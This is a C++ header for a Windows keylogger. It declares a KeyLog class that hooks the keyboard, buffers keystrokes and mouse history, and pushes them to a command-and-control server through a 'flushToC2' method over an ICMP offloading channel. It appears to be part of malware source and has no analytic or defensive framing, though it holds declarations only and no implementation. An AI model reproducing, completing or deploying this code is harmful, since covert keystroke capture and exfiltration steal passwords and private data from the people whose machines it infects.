#ifndef KEYLOG_H_
#define KEYLOG_H_
#include <Windows.h>
#include <vector>
#include "types.h"
#include "ICMPOffload.h"
constexpr unsigned int MAX_KEY_HISTORY          = 20;
constexpr unsigned int MAX_MOUSE_HISTORY        = 10;


class KeyLog
{
public:

    KeyLog();
    ~KeyLog();
    
    bool init();

    __forceinline HHOOK* getHook() { return &mHook; }
    void addKey(int keyCode);
private:

    static LRESULT CALLBACK KlGetKey(int nCode, WPARAM wparam, LPARAM lparam);
    void flushToC2();

    KeyBuffer mkeyBuffer;
    HHOOK mHook;
    ICMPOffload mOffloader;
};

extern KeyLog gLogger;


#endif // KEYLOG_H_